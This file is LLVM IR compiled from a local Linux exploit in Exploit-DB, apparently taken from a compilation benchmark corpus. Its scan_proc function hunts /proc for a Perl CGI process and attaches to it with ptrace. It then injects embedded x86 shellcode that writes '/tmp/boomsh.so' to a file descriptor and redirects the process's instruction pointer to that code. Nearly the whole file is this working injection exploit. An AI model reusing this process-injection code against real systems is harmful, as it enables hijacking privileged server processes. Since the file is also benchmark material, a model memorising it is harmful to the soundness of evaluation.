; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21667.c_scan_proc.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21667.c_scan_proc.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.scan_proc.code = private unnamed_addr constant [61 x i8] c"\90\90\90\90\90\90\90\90\90\90\90\90\E8\10\00\00\00/tmp/boomsh.so\0A\00\B8\04\00\00\00\BB\05\00\00\00Y\BA\0F\00\00\00\CD\80\B8\01\00\00\001\DB\CD\80\00", align 16
@.str = private unnamed_addr constant [48 x i8] c"Forking off proc-scan to attach to CGI-script.\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c"/proc/%d/cmdline\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@PTRACE_ATTACH = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [20 x i8] c"Got cgi-bin PID %d\0A\00", align 1
@PTRACE_PEEKUSER = common dso_local global i32 0, align 4
@EIP = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [7 x i8] c"ptrace\00", align 1
@PTRACE_POKETEXT = common dso_local global i32 0, align 4
@PTRACE_POKEUSER = common dso_local global i32 0, align 4
@PTRACE_DETACH = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [35 x i8] c"Injecting of write-code finished.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @scan_proc() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = alloca [61 x i8], align 16
  %9 = alloca i64*, align 8
  store i32 0, i32* %5, align 4
  %10 = bitcast [61 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([61 x i8], [61 x i8]* @__const.scan_proc.code, i32 0, i32 0), i64 61, i1 false)
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str, i64 0, i64 0))
  %12 = call i64 (...) @fork()
  %13 = icmp sgt i64 %12, 0
  br i1 %13, label %14, label %15

14:                                               ; preds = %0
  ret i32 0

15:                                               ; preds = %0
  %16 = call i32 (...) @getpid()
  store i32 %16, i32* %1, align 4
  br label %17

17:                                               ; preds = %61, %15
  %18 = load i32, i32* %5, align 4
  %19 = icmp ne i32 %18, 0
  %20 = xor i1 %19, true
  br i1 %20, label %21, label %62

21:                                               ; preds = %17
  store i32 0, i32* %3, align 4
  br label %22

22:                                               ; preds = %58, %21
  %23 = load i32, i32* %3, align 4
  %24 = icmp slt i32 %23, 100
  br i1 %24, label %25, label %61

25:                                               ; preds = %22
  %26 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %27 = load i32, i32* %1, align 4
  %28 = load i32, i32* %3, align 4
  %29 = add nsw i32 %27, %28
  %30 = call i32 @snprintf(i8* %26, i32 1024, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0), i32 %29)
  %31 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %32 = load i32, i32* @O_RDONLY, align 4
  %33 = call i32 @open(i8* %31, i32 %32)
  store i32 %33, i32* %2, align 4
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %36

35:                                               ; preds = %25
  br label %58

36:                                               ; preds = %25
  %37 = load i32, i32* %2, align 4
  %38 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %39 = call i32 @read(i32 %37, i8* %38, i32 1024)
  %40 = load i32, i32* %2, align 4
  %41 = call i32 @close(i32 %40)
  %42 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %43 = call i64 @strcmp(i8* %42, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  %44 = icmp eq i64 %43, 0
  br i1 %44, label %45, label %57

45:                                               ; preds = %36
  %46 = load i32, i32* @PTRACE_ATTACH, align 4
  %47 = load i32, i32* %1, align 4
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %47, %48
  %50 = call i64 @ptrace(i32 %46, i32 %49, i32 0, i32 0)
  %51 = icmp slt i64 %50, 0
  br i1 %51, label %52, label %56

52:                                               ; preds = %45
  %53 = load i32, i32* %1, align 4
  %54 = load i32, i32* %3, align 4
  %55 = add nsw i32 %53, %54
  store i32 %55, i32* %4, align 4
  store i32 1, i32* %5, align 4
  br label %61

56:                                               ; preds = %45
  br label %57

57:                                               ; preds = %56, %36
  br label %58

58:                                               ; preds = %57, %35
  %59 = load i32, i32* %3, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %3, align 4
  br label %22

61:                                               ; preds = %52, %22
  br label %17

62:                                               ; preds = %17
  %63 = load i32, i32* %4, align 4
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i32 %63)
  %65 = load i32, i32* %4, align 4
  %66 = call i32 @waitpid(i32 %65, i32* null, i32 0)
  %67 = load i32, i32* @PTRACE_PEEKUSER, align 4
  %68 = load i32, i32* %4, align 4
  %69 = load i32, i32* @EIP, align 4
  %70 = mul nsw i32 4, %69
  %71 = call i64 @ptrace(i32 %67, i32 %68, i32 %70, i32 0)
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* %6, align 4
  %73 = load i64, i64* @errno, align 8
  %74 = icmp ne i64 %73, 0
  br i1 %74, label %75, label %77

75:                                               ; preds = %62
  %76 = call i32 @die(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %77

77:                                               ; preds = %75, %62
  %78 = getelementptr inbounds [61 x i8], [61 x i8]* %8, i64 0, i64 0
  %79 = bitcast i8* %78 to i64*
  store i64* %79, i64** %9, align 8
  br label %80

80:                                               ; preds = %98, %77
  %81 = load i32, i32* %3, align 4
  %82 = sext i32 %81 to i64
  %83 = icmp ult i64 %82, 61
  br i1 %83, label %84, label %103

84:                                               ; preds = %80
  %85 = load i32, i32* @PTRACE_POKETEXT, align 4
  %86 = load i32, i32* %4, align 4
  %87 = load i32, i32* %6, align 4
  %88 = load i32, i32* %3, align 4
  %89 = add i32 %87, %88
  %90 = load i64*, i64** %9, align 8
  %91 = load i64, i64* %90, align 8
  %92 = trunc i64 %91 to i32
  %93 = call i64 @ptrace(i32 %85, i32 %86, i32 %89, i32 %92)
  %94 = icmp slt i64 %93, 0
  br i1 %94, label %95, label %97

95:                                               ; preds = %84
  %96 = call i32 @die(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %97

97:                                               ; preds = %95, %84
  br label %98

98:                                               ; preds = %97
  %99 = load i32, i32* %3, align 4
  %100 = add nsw i32 %99, 4
  store i32 %100, i32* %3, align 4
  %101 = load i64*, i64** %9, align 8
  %102 = getelementptr inbounds i64, i64* %101, i32 1
  store i64* %102, i64** %9, align 8
  br label %80

103:                                              ; preds = %80
  %104 = load i32, i32* @PTRACE_POKEUSER, align 4
  %105 = load i32, i32* %4, align 4
  %106 = load i32, i32* @EIP, align 4
  %107 = mul nsw i32 4, %106
  %108 = load i32, i32* %6, align 4
  %109 = add i32 %108, 4
  %110 = call i64 @ptrace(i32 %104, i32 %105, i32 %107, i32 %109)
  %111 = icmp slt i64 %110, 0
  br i1 %111, label %112, label %114

112:                                              ; preds = %103
  %113 = call i32 @die(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %114

114:                                              ; preds = %112, %103
  %115 = load i32, i32* @PTRACE_DETACH, align 4
  %116 = load i32, i32* %4, align 4
  %117 = call i64 @ptrace(i32 %115, i32 %116, i32 0, i32 0)
  %118 = icmp slt i64 %117, 0
  br i1 %118, label %119, label %121

119:                                              ; preds = %114
  %120 = call i32 @die(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %121

121:                                              ; preds = %119, %114
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  %123 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i64 @fork(...) #2

declare dso_local i32 @getpid(...) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i32) #2

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i64 @strcmp(i8*, i8*) #2

declare dso_local i64 @ptrace(i32, i32, i32, i32) #2

declare dso_local i32 @waitpid(i32, i32*, i32) #2

declare dso_local i32 @die(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
